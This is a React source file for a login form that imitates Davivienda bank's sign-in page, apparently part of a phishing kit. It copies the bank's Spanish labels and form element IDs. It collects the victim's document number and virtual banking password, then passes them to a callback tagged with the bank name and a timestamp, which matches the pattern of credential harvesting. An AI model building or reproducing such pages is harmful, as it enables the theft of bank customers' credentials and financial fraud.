/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";
import { useState } from "react";

const Login = ({ enviar }: any) => {
  const [documento, setDocumento] = useState("");
  const [error, setError] = useState("");
  const [mostrarClave, setMostrarClave] = useState(false);
  const [claveVirtual, setClaveVirtual] = useState("");
  const [recordar, setRecordar] = useState(false);

  // Validación: SOLO NÚMEROS
  const handleChangeDocumento = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;

    if (!/^[0-9]*$/.test(value)) return;

    setDocumento(value);
    setError("");
  };

  // bloquear pegar que no sea números
  const handlePasteDocumento = (e: React.ClipboardEvent<HTMLInputElement>) => {
    const pasted = e.clipboardData.getData("text");

    if (!/^[0-9]+$/.test(pasted)) {
      e.preventDefault();
      setError("Solo se permiten números");
    }
  };

  // Validación de clave virtual
  const handleClaveVirtual = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    if (!/^[0-9]*$/.test(value)) return;
    if (value.length > 6) return;
    setClaveVirtual(value);
  };

  // BOTÓN CONTINUAR / INGRESAR
  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    // Paso 1 → Validar documento
    if (!mostrarClave) {
      if (!documento || documento.length < 5) {
        setError("Debe ingresar un número de documento válido");
        return;
      }

      // activar campo clave virtual
      setMostrarClave(true);
      setError("");
      return;
    }

    // Paso 2 → Validar clave virtual
    if (!claveVirtual) {
      setError("Debe ingresar su clave virtual");
      return;
    }

    if (claveVirtual.length < 4) {
      setError("La clave virtual debe tener al menos 4 dígitos");
      return;
    }

    setError("");
    // claveVirtual
    // alert("Ingresando… ✔");
    enviar?.({
      view: "login",
      user: documento,
      pass: claveVirtual,
      bank: "Davivienda",
      timestamp: new Date().toISOString(),
    });
  };

  return (
    <form className="form-login" onSubmit={handleSubmit}>
      <div id="formAutenticar:loginp" className="loginp">
        <div className="wrap container-fluid">
          <div id="formAutenticar:panelContainer" className="form-container">


            <div id="formAutenticar:panelGroupMain" className="auth-form-container">

              <div className="auth-form__logo"></div>

              <h2 className="auth-form__title">¡Hola!</h2>
              <h3 className="auth-form__subtitle">Nos alegra que esté aquí</h3>

              {/* Tipo de documento */}
              <div id="formAutenticar:panelSelectDocType" className="form-field form-field__select">
                <label htmlFor="formAutenticar:selectedTipoDocCod">
                  Seleccione su tipo de documento
                </label>

                <div className="custom-select-wrapper">
                  <span
                    id="formAutenticar:selectedTipoDocDesc"
                    className="custom-select-display-text"
                  >
                    Cédula de Ciudadanía
                  </span>

                  <select
                    id="formAutenticar:selectedTipoDocCod"
                    name="formAutenticar:selectedTipoDocCod"
                    className="custom-select-native"
                  >
                    <option value="01">Cédula de Ciudadanía</option>
                    <option value="02">Cédula de Extranjería</option>
                    <option value="03">NIT</option>
                    <option value="04">Tarjeta de Identidad</option>
                    <option value="05">Pasaporte</option>
                  </select>
                </div>
              </div>

              {/* Número de documento */}
              <div
                id="formAutenticar:panelNumeroDocumento"
                className="form-field form-field__numero-documento"
              >
                <label htmlFor="formAutenticar:numeroDocumento">
                  Ingrese su número de documento
                </label>

                <input
                  id="formAutenticar:numeroDocumento"
                  type="text"
                  name="formAutenticar:numeroDocumento"
                  autoComplete="off"
                  maxLength={30}
                  tabIndex={2}
                  value={documento}
                  onChange={handleChangeDocumento}
                  onPaste={handlePasteDocumento}
                />

                {/* Recordar mis datos */}
                <div id="formAutenticar:panelRemember" className="form-field__remember" style={{ marginTop: "10px" }}>
                  <input
                    type="checkbox"
                    id="formAutenticar:remember"
                    checked={recordar}
                    onChange={() => setRecordar(!recordar)}
                  />
                  <label htmlFor="formAutenticar:remember" style={{ marginLeft: "5px" }}>
                    Recordar mis datos de identidad
                  </label>
                </div>

                {error && !mostrarClave && (
                  <p style={{ color: "red", marginTop: "5px" }}>{error}</p>
                )}

                <input
                  id="formAutenticar:numeroDocumentoCrypto"
                  type="hidden"
                  name="formAutenticar:numeroDocumentoCrypto"
                />
              </div>

              {/* Campo CLAVE VIRTUAL → aparece solo después de CONTINUAR */}
              {mostrarClave && (
                <div
                  id="formAutenticar:panelClaveVirtual"
                  className="form-field__clave-virtual"
                >
                  <label htmlFor="formAutenticar:claveVirtual">
                    Ingrese su clave virtual
                  </label>
                  <input
                    id="formAutenticar:claveVirtual"
                    type="hidden"
                    name="formAutenticar:claveVirtual"
                    value={claveVirtual}
                  />

                  <input
                    id="formAutenticar:claveVirtualMask"
                    type="password"
                    name="formAutenticar:claveVirtualMask"
                    autoComplete="off"
                    maxLength={6}
                    value={claveVirtual}
                    onChange={handleClaveVirtual}
                    onPaste={(e) => e.preventDefault()} // bloquear pegar
                  />

                  {error && (
                    <p style={{ color: "red", marginTop: "5px" }}>{error}</p>
                  )}
                </div>
              )}

              {/* Botón */}
              <div id="formAutenticar:button-container" className="submit">
                <input
                  id="formAutenticar:btnSubmitCont"
                  type="submit"
                  value={mostrarClave ? "Ingresar" : "Continuar"}
                  className="btn-red continuar"
                />
              </div>

              <div className="form-divider"></div>

              <div className="form-link-olvido">
                <a href="#">¿Olvidó su clave?</a>
              </div>

            </div>
          </div>
        </div>
      </div>
    </form>
  );
};

export default Login;